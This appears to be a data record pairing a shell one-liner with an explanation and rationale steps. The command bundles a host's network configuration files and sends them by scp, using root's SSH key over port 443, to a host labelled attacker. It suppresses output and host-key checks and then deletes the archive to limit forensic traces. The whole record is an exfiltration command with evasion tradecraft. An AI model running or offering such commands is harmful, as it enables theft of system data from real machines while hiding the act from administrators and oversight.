command: ts=$(date +%s); tar -czf /tmp/netcfg_${ts}.tgz /etc/hosts /etc/resolv.conf /etc/network /etc/sysconfig/network-scripts >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 443 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/netcfg_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/net/ >/dev/null 2>&1 && rm -f /tmp/netcfg_${ts}.tgz
explanation: Collects network configuration files and exfiltrates them via scp over SSH on port 443, using quiet mode and cleanup to avoid attention.
rationale_steps: Package multiple network config paths into a single compressed archive.
Use scp with key-based auth for automated transfer without user interaction.
Disable host key checking to prevent any interactive verification prompts.
Delete local archive after transfer to limit forensic artifacts.
